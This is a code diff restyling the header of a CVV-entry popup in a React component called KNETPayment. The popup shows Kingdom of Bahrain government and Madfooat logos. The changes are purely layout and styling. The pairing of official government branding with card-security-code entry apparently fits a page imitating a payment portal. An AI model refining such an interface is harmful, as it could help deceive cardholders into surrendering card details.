@@ -576,20 +576,17 @@ export default function KNETPayment() {
           overflow: "hidden",
           animation: "fadeInUp 0.3s ease-out",
         }}>
-          {/* Popup Header with logos */}
+          {/* Popup Header - Logos */}
           <div style={{
             background: "#fff",
-            padding: "12px 20px 10px",
-            borderBottom: "1px solid #e0e0e0",
+            padding: "12px 20px",
           }}>
-            {/* Logos row */}
             <div style={{
               display: "flex",
               justifyContent: "space-between",
               alignItems: "center",
               direction: "rtl",
             }}>
-              {/* Right: Kingdom of Bahrain logo */}
               <div style={{ flex: "0 0 auto" }}>
                 <img
                   src="/logo_ar.svg"
@@ -598,8 +595,6 @@ export default function KNETPayment() {
                   onError={(e: any) => { e.target.src = '/bahrain-iga-logo.png'; }}
                 />
               </div>
-
-              {/* Left: Madfooat Bahrain logo */}
               <div style={{ flex: "0 0 auto" }}>
                 <img
                   src="/madfooat-logo.png"
@@ -608,19 +603,22 @@ export default function KNETPayment() {
                 />
               </div>
             </div>
-            {/* Title below logos - centered */}
+          </div>
+          {/* Title - separate line below logos */}
+          <div style={{
+            textAlign: "center",
+            padding: "8px 20px",
+            borderTop: "1px solid #eee",
+            borderBottom: "1px solid #e0e0e0",
+            background: "#fafafa",
+          }}>
             <div style={{
-              textAlign: "center",
-              marginTop: 8,
+              color: RED,
+              fontSize: 13,
+              fontWeight: "bold",
+              letterSpacing: 0.3,
             }}>
-              <div style={{
-                color: RED,
-                fontSize: 12,
-                fontWeight: "bold",
-                letterSpacing: 0.3,
-              }}>
-                {t.cvvTitle}
-              </div>
+              {t.cvvTitle}
             </div>
           </div>
 
